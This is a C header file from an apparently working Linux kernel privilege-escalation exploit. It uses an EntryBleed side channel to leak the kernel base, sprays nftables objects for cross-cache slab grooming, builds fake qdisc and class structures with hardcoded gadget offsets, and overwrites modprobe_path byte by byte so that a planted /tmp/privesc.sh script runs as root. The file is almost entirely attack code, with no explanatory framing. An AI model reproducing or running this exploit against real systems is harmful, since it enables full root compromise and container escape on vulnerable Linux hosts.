#ifndef PWN_PWN_ENV2_H
#define PWN_PWN_ENV2_H

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/resource.h>
#include <sys/wait.h>

#include <libmnl/libmnl.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <libnftnl/table.h> 

// Kernel base address
uint64_t g_kernel_base = 0;

// Address of kernfs_pr_cont_buf
uint64_t g_kernfs_addr = 0;

// Address of the offset from kernel base for kernfs_pr_cont_buf
// uint64_t kernfs_addr_off_6 = 0x3691a80;
uint64_t kernfs_addr_off_5 = (0xffffffff84267b80 - 0xffffffff81000000);

// Offset for entry_SYSCALL_64_offset
uint64_t g_entry_syscall_off = 0;

// Based on kernel version
// uint64_t entry_syscall_off_6 = 0x1400040;
uint64_t entry_syscall_off_5 = 0x1200080;

// Our arbitrary write gadget clear_nlink
uint64_t g_write_gadget_addr = 0;

// Based on kernel version
uint64_t write_gadget_off_5 = (0xffffffff81356330 - 0xffffffff81000000);
// uint64_t write_gadget_off_6 = 0;

uint64_t g_corepattern_addr = 0;
uint64_t g_corepattern_addr_off_5 = (0xffffffff8379eb00 - 0xffffffff81000000);

// Modprobe path addr
uint64_t g_modprobe_addr = 0;

// Based on kernel version 
uint64_t modprobe_off_5 = (0xffffffff83662e80 - 0xffffffff81000000);
// uint64_t modprobe_off_6 = 0;

// A mutable write target that we use to overwrite modprobe one byte at a time
uint64_t g_write_target = 0;

// Our Return NULL gadget sch_frag_dst_get_mtu
uint64_t g_null_gadget_addr = 0;

// Based on kernel version
uint64_t null_gadget_off_5 = (0xffffffff81d4ac10 - 0xffffffff81000000);
// uint64_t null_gadget_off_6 = 0;

// We target [rax + 0x450] with our gadget, so we subtract this from the ptr
// value in our fake buffer
#define WRITE_TARGET_OFFSET 0x450UL

// Pin our process (and children from system() / fork()) to core-0
void pin_to_core_0() {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);

    if (sched_setaffinity(0, sizeof(mask), &mask) < 0) {
        perror("sched_setaffinity");
        exit(-1);
    }
}

// Start listener
void start_udp_listener(void) {
    system("nohup ./socat.bin -u UDP-RECV:8888 STDOUT >/dev/null 2>&1 &");
}

#define PIPE_MAX 32
#define PIPE_READ 0
#define PIPE_WRITE 1

// An array to hold pipe fds
int g_pipes_arr[PIPE_MAX][2];

// Allocate pipes 
void allocate_pipes(void) {
    for (int i = 0; i < PIPE_MAX; i++) {
        if (pipe(g_pipes_arr[i]) == -1) {
            perror("pipe");
            exit(-1);
        }
    }
}

// Attempt to reclaim our page by allocating pages to back the pipes
void reclaim_page(void) {
    char write_buf[4096] = { 0 };
    memset(&write_buf[0], 'B', 4096);

    for (int i = 0; i < PIPE_MAX; i++) {
        write(g_pipes_arr[i][PIPE_WRITE], write_buf, 4096);
    }
}

#define NUM_SPRAY_OBJS 4096UL
#define USERDATA_SIZE 128UL
#define MNL_BUF_SIZE 4096UL

// Global for user data, set once
char g_userdata[USERDATA_SIZE];

// Creates a single nftables table to spray userdata
void create_table(const char *table_name) {
    if (!table_name) {
        fprintf(stderr, "Error: Table name is NULL\n");
        return;
    }

    struct mnl_socket *mnl_sock;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_BUF_SIZE];

    // Open Netlink socket
    mnl_sock = mnl_socket_open(NETLINK_NETFILTER);
    if (!mnl_sock) {
        perror("mnl_socket_open");
        exit(EXIT_FAILURE);
    }

    // Connect to Netlink
    if (mnl_socket_bind(mnl_sock, 0, MNL_SOCKET_AUTOPID) < 0) {
        perror("mnl_socket_bind");
        mnl_socket_close(mnl_sock);
        exit(EXIT_FAILURE);
    }

    // Initialize Netlink batch (one message per batch)
    memset(buf, 0, sizeof(buf));
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    int seq = 0;
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    struct nftnl_table *table = nftnl_table_alloc();
    if (!table) {
        perror("nftnl_table_alloc");
        mnl_socket_close(mnl_sock);
        return;
    }

    // Set table attributes
    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, NFPROTO_INET);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    // Set 128-byte userdata
    nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, g_userdata, USERDATA_SIZE);

    // Build Netlink message
    struct nlmsghdr *msg_hdr = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWTABLE,
        NFPROTO_INET,
        NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
        seq++
    );

    // Attach table payload
    nftnl_table_nlmsg_build_payload(msg_hdr, table);
    nftnl_table_free(table);
    mnl_nlmsg_batch_next(batch);

    // End batch (one message only)
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // Send the batch (one message per batch)
    if (mnl_socket_sendto(mnl_sock, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        perror("mnl_socket_sendto");
        mnl_socket_close(mnl_sock);
        return;
    }

    ssize_t recv_len = mnl_socket_recvfrom(mnl_sock, buf, sizeof(buf));
    if (recv_len < 0) {
        perror("mnl_socket_recvfrom");
    } else {
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        if (nlh->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *err = (struct nlmsgerr *)mnl_nlmsg_get_payload(nlh);
            if (err->error) {
                fprintf(stderr, "Netlink error: %s\n", strerror(-err->error));
            }
        }
    }

    // Cleanup
    mnl_nlmsg_batch_stop(batch);
    mnl_socket_close(mnl_sock);
}

// Deletes a single nftables table
void delete_table(const char *table_name) {
    if (!table_name) {
        fprintf(stderr, "Error: Table name is NULL\n");
        return;
    }

    struct mnl_socket *mnl_sock;
    struct mnl_nlmsg_batch *batch;
    char buf[MNL_BUF_SIZE];

    // Open Netlink socket
    mnl_sock = mnl_socket_open(NETLINK_NETFILTER);
    if (!mnl_sock) {
        perror("mnl_socket_open");
        exit(EXIT_FAILURE);
    }

    // Connect to Netlink
    if (mnl_socket_bind(mnl_sock, 0, MNL_SOCKET_AUTOPID) < 0) {
        perror("mnl_socket_bind");
        mnl_socket_close(mnl_sock);
        exit(EXIT_FAILURE);
    }

    // Initialize Netlink batch
    memset(buf, 0, sizeof(buf));
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    int seq = 0;
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    struct nftnl_table *table = nftnl_table_alloc();
    if (!table) {
        perror("nftnl_table_alloc");
        mnl_socket_close(mnl_sock);
        return;
    }

    // Set table attributes
    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, NFPROTO_INET);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    // Build Netlink message for table deletion
    struct nlmsghdr *msg_hdr = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_DELTABLE,
        NFPROTO_INET,
        NLM_F_ACK,
        seq++
    );

    // Attach table payload
    nftnl_table_nlmsg_build_payload(msg_hdr, table);
    nftnl_table_free(table);
    mnl_nlmsg_batch_next(batch);

    // End batch
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // Send the batch
    if (mnl_socket_sendto(mnl_sock, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        perror("mnl_socket_sendto");
        mnl_socket_close(mnl_sock);
        return;
    }

    ssize_t recv_len = mnl_socket_recvfrom(mnl_sock, buf, sizeof(buf));
    if (recv_len < 0) {
        perror("mnl_socket_recvfrom");
    } else {
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        if (nlh->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *err = (struct nlmsgerr *)mnl_nlmsg_get_payload(nlh);
            if (err->error) {
                fprintf(stderr, "Netlink error: %s\n", strerror(-err->error));
                printf("Table name was: %s\n", table_name);
            }
        }
    }

    // Cleanup
    mnl_nlmsg_batch_stop(batch);
    mnl_socket_close(mnl_sock);
}

void spray_tables(void) {
    for (size_t i = 0; i < NUM_SPRAY_OBJS; i++) {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%zu", i);
        create_table(table_name);
    }
}

// Try to use entry bleed to leak the kernel base
#define KERNEL_LOWER_BOUND 0xffffffff80000000ULL
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ULL

uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "lfence;"
    "prefetchnta qword ptr [%4];"
    "prefetcht2 qword ptr [%4];"
    "xor rax, rax;"
    "lfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

#define STEP 0x100000ull
#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (KERNEL_UPPER_BOUND - KERNEL_LOWER_BOUND) / STEP

uint64_t leak_syscall_entry(uint64_t scan_start, uint64_t scan_end) 
{
    (void)scan_end;
    uint64_t data[ARR_SIZE] = {0};
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE; idx++) 
        {
            uint64_t test = scan_start + idx * STEP;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (size_t i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = scan_start + i * STEP;
        }
    }

    return addr;
}

// Setup our class/qdisc hierarchy
void setup_classes(void) {
    // Create root qdisc
    printf("[>] Creating root qdisc...\n");
    system("./tc.bin qdisc add dev lo root handle 1:0 drr");

    // Create class 1:1
    printf("[>] Creating class 1:1...\n");
    system("./tc.bin class add dev lo classid 1:1 drr");

    // Create class 1:2
    printf("[>] Creating class 1:3...\n");
    system("./tc.bin class add dev lo classid 1:3 drr");

    // Assign plug qdisc to class 1:1
    printf("[>] Assigning plug qdisc to class 1:1...\n");
    system("./tc.bin qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024");

    // Assign pfifo qdisc to class 1:3
    printf("[>] Assigning pfifo qdisc to class 1:3...\n");
    system("./tc.bin qdisc add dev lo parent 1:3 handle 3:0 pfifo");
}

// Cross cache defines
#define OBJS_PER_SLAB 32UL  // Number of objects in a kmalloc-128 page
#define CPU_PARTIAL 30UL    // Number of partial pages for kmalloc-128
#define OVERFLOW_FACTOR 4UL // We want to overkill this 

// Cross cache globals
typedef struct cc_bucket {
    uint64_t min;
    uint64_t max;
} cc_bucket_t;

cc_bucket_t cc1_bucket = { 0 };
cc_bucket_t cc2_bucket = { 0 };
cc_bucket_t cc3_bucket = { 0 };

// Cross-cache stage 1: Spray enough objects that we start getting brand new
// slab allocations in kmalloc-128 and also reserve enough pages that when
// they are placed on the partials list they will evict empty pages 
void cc_1(void) {
    // Calculate the number of objects to spray
    uint64_t spray_amt = (OBJS_PER_SLAB * (CPU_PARTIAL + 1)) * OVERFLOW_FACTOR;

    // Spray the tables
    for (size_t i = 0; i < spray_amt; i++) {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%zu", i);
        create_table(table_name);
    }

    // Update the bucket
    cc1_bucket.min = 0;
    cc1_bucket.max = spray_amt - 1;
}

// Cross-cache stage 2: Allocate enough objects that we probably land somewhere
// in the middle of a new slab (page) so that our object is probably not the 
// exact first or last object on the page
void cc_2(void) {
    // Calculate the number of objects to spray
    uint64_t spray_amt = OBJS_PER_SLAB - 1;

    // Take into account cc1 when spraying
    uint64_t offset = cc1_bucket.max + 1;
    for (size_t i = 0; i < spray_amt; i++) {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%zu", i + offset);
        create_table(table_name);
    }

    // Update the bucket
    cc2_bucket.min = offset;
    cc2_bucket.max = offset + spray_amt;
}

// Cross-cache stage 3: Allocate enough objects to complete the victim slab and 
// probably go over onto a new brand new slab
void cc_3(void) {
    // Calculate the number of objects to spray
    uint64_t spray_amt = OBJS_PER_SLAB + 2; // Extra one here for class 1:1?

    // Take into account cc2 when spraying
    uint64_t offset = cc2_bucket.max;
    for (size_t i = 0; i < spray_amt; i++) {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%ld", i + offset);
        create_table(table_name);
    }

    // Update the bucket
    cc3_bucket.min = offset;
    cc3_bucket.max = offset + spray_amt; 
}

// Free all of the objects we allocated in steps 2 and 3. This will place these
// pages on the kmalloc-128 partials list
void cc_4(void) {
    // Calculate the id to start with and the amt to free
    uint64_t start = cc2_bucket.min;
    uint64_t free_amt = cc3_bucket.max - start;

    for (size_t i = 0; i < free_amt; i++) {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%ld", i + start);
        delete_table(table_name);
    }
}

// Free an object on each of the pages that we allocated in step 1. This will
// place all of these pages onto the partials list and evict our empty page
void cc_5(void) {
    // Pick the first object to free
    uint64_t start = cc1_bucket.min;

    // Establish the max free object
    uint64_t max = cc1_bucket.max;

    // Free one object per page 
    for (size_t i = start; i < max; i += OBJS_PER_SLAB) {
        char table_name[32];
        snprintf(table_name, sizeof(table_name), "table.%zu", i);
        delete_table(table_name);
    }
}

char *required_files[] = {
    "tc.bin",
    "ip.bin",
    "socat.bin",
    "iptables.bin"
};

size_t num_files = 3;

int get_kernel_version(void) {
    struct utsname buffer;
    
    if (uname(&buffer) != 0) {
        perror("uname");
        exit(-1);
    }

    int major_version = 0;
    sscanf(buffer.release, "%d", &major_version);

    return major_version;
}

// Fake class data
uint8_t g_class[128] = { 0 };

// Setup the fake class contents in the pipes
void setup_fake_class(void) {
    // Set each one up with cyclical pattern for debugging
    uint64_t *ptr = (uint64_t *)&g_class[0];
    uint64_t val = 0x4141414141414141;
    for (int i = 0; i < 128 / 8; i++) {
        ptr[i] = val;
        val += 0x0101010101010101;
    }

    // Fake &cl->qdisc, set it to the address of the kernfs buffer + 8 to avoid
    // a NULL later when we use the address of &qdisc->gso_skb
    ptr[12] = g_kernfs_addr + 8;
    // ptr[12] = 0xd00fd00fd00fd00f;


    // Fake the &cl->deficit value, set it such that it is always greater than
    // the "len" returned from qdisc_pkt_len inside of drr_dequeue
    ptr[13] = 0xFFFFFFFFFFFFFFFF;

    // Fake class data is setup, we can fit 32 on a page. So each pipe gets
    // 32 fake classes in its backing page. Reset all the pipe buffer contents
    // to be the fake class
    char drain[4096] = { 0 };
    for (int i = 0; i < PIPE_MAX; i++) {
        // Drain the current pipe
        read(g_pipes_arr[i][PIPE_READ], drain, 4096);

        // Write the class contents to the pipe 32 times
        for (int j = 0; j < 32; j++) {
            ssize_t bytes_written = 0;
            while (bytes_written < 128) {
                ssize_t ret = 
                    write(
                        g_pipes_arr[i][PIPE_WRITE],
                        g_class + bytes_written,
                        128 - bytes_written);
                if (ret <= 0) {
                    perror("write failed");
                    exit(EXIT_FAILURE);
                }
                bytes_written += ret;
            }
        }
    }
}


// Fake qdisc data
uint8_t g_qdisc[4096] = { 0 };

// Send controlled data to deducible address in kernel from kernel base
void fill_kernfs_buf(void) {
    // Create a lockfile that we can actually use
    setenv("XTABLES_LOCKFILE", "/tmp/xtables.lock", 1);

    // Redirect stdout and stderr to /dev/null
    int devnull = open("/dev/null", O_WRONLY);
    if (devnull < 0) {
        exit(-1);
    }
    dup2(devnull, STDOUT_FILENO);
    dup2(devnull, STDERR_FILENO);
    close(devnull);

    // Execute iptables to fill buffer
    execl("./xtables-legacy-multi", "iptables", "-A", "OUTPUT", "-m", "cgroup", "--path",
        g_qdisc, "-j", "LOG", (char *)NULL);
}

// Check for NULL byte in u64
int has_null(uint64_t val) {
    for (int i = 0; i < 8; i++) {
        if (((val >> (i * 8)) & 0xFF) == 0) {
            return 1;
        }
    }
    return 0;
}

void setup_fake_qdisc(size_t num_complete) {
    // Set each one up with cyclical pattern for debugging
    uint64_t *ptr = (uint64_t *)&g_qdisc[0];
    uint64_t val = 0x0101010101010101;
    for (int i = 0; i < 4906 / 8; i++) {
        ptr[i] = val;
        val += 0x0101010101010101;
    }

    // Fake &qdisc->ops, set it kind of far into the kernfs_buf to avoid conflict
    ptr[4] = g_kernfs_addr + 32;

    // Fake &qdisc->ops->peek
    ptr[11] = g_write_gadget_addr;
    // ptr[11] = 0xd00fd00fd00fd00f;

    // The write address for the write gadget
    ptr[6] = g_write_target + num_complete;

    // Inside qdisc_dequeue_peeked, we do skb_peek(&sch->gso_skb) and that
    // address has to point to itself, so make &sch->gso_skb equal itself
    ptr[17] = g_kernfs_addr + 0x88;

    // Place pointer to our return NULL gadget so that qdisc_dequeue_peeked
    // returns NULL
    ptr[2] = g_null_gadget_addr;

    // NULL gadget does `return dst->dev->mut` and dev happens to be the first
    // field, so set ours to a pointer that points to NULL (NULL happens later
    // in the kernfs_buf)
    ptr[1] = g_kernfs_addr + 512;

    // These addresses cannot have a NULL in them or else our kernfs_buf gets
    // NULL terminated and we're out of luck
    if (
        has_null(g_kernfs_addr + 120) || 
        has_null(g_write_gadget_addr) ||
        has_null(g_write_target)      ||
        has_null(g_kernfs_addr + 0x88)
        ) {
        printf("NULL ptr in these values: 0x%lx, 0x%lx\n",
            g_kernfs_addr + 120, g_write_gadget_addr);
        exit(-1);
    }
}

// Send kernfs data to the kernel
void send_kernfs_data(void) {
    int pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(-1);
    }

    // Child
    if (pid == 0) {
        fill_kernfs_buf(); // Doesn't return
    }

    // Parent, wait for child to finish
    int status;
    waitpid(pid, &status, 0);
}

// Trigger the bug
void trigger_bug(void) {
    // system("echo \"\" | ./socat.bin -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10002))");
    send_req(get_id("1:1"));
}

// Trigger bug and increment kernel value for /sbin/modeprobe overwrite
void increment_kernel_val(size_t num_complete) {
    (void)num_complete;
    // Reset the fake class data, because deficit changes each iteration
    setup_fake_class();

    // Reset the fake qdisc data, we NULL out the field in the increment gadget
    setup_fake_qdisc(num_complete);

    // Send the data to the kernel
    send_kernfs_data();

    // puts("triggering the bug soon :D");
    // mypause();
    // Trigger the bug
    trigger_bug();

}

// Overwrite modprobe path
void overwrite_modprobe(void) {
    // We have an increment gadget as our write primitive. This means we'll 
    // target each byte of /sbin/modprobe at a time and increment that byte
    // until it's the right value. We start here: /'s'bin/modprobe. The way
    // that I decided to do this was to simply encode the logic in this function
    // by simulating each write as we do it in the kernel and then we can
    // check in the program if we're done or not. So let's setup our simulated
    // values:
    // 
    // What we're starting with
    const char sim_start[] = "/sbin/modprobe\x00\x00";
    // const char sim_start[] = "core\x00\x00\x00\x00\x00\x00\x00";

    // What our goal is
    const char sim_goal[] = "/proc/500/fd/666";
    // const char sim_goal[] = "|/tmp/ev.sh";

    // Buffer to simulate writes
    uint8_t sim_modprobe[128] = { 0 };
    memcpy(sim_modprobe, sim_start, sizeof(sim_start));

    // What we're targeting right now. We start at offset 1 because '/' already
    // works for us
    char *sim_write_target = (char *)&sim_modprobe[1];

    // Iterate until the memory is identical
    size_t num_complete = 0;
    int64_t *write_ptr = (int64_t *)sim_write_target;
    while (memcmp(sim_goal, sim_modprobe, sizeof(sim_goal))) {
        // Iterate until the character matches
        while (memcmp(sim_write_target, sim_goal + num_complete + 1, 1)) {
            // Increment the val and set it
            int64_t curr_val = *write_ptr;
            curr_val++;
            *write_ptr = curr_val;

            // Increment the value in the kernel
            increment_kernel_val(num_complete);
        }

        // This character matches, move to the next character
        sim_write_target++;
        write_ptr = (int64_t *)sim_write_target;
        num_complete++;
    }
}

#define BUFFER_SIZE 1024

// What children do
void child_func() {
    // Open the privesc script
    int fd = open("/tmp/privesc.sh", O_RDONLY);
    dup2(fd, 666);
    // if (fd != 3) {
    //     printf("Got the wrong fd for privesc.sh\n");
    //     exit(-1);
    // }

    char buffer[BUFFER_SIZE];
    ssize_t bytes_read;

    // Block until there's data to read from stdin
    while ((bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer))) > 0) {
        write(STDOUT_FILENO, buffer, bytes_read);
    }

    // Handle possible read errors
    if (bytes_read < 0) {
        perror("read");
        exit(EXIT_FAILURE);
    }

    // Exit
    exit(0);
}

// How many child processes we spawn
#define NUM_CHILDS 500UL

// Spray children processes so we have a predictable pid in the container
void spray_children(void) {
    for (size_t i = 0; i < NUM_CHILDS; i++) {
        int pid = fork();
        if (pid < 0) {
            perror("fork");
            exit(-1);
        }


        // Child
        if (pid == 0) {
            child_func();
        } else {
            printf("[~] pid: %d\n", pid);
        }
    }
}

#endif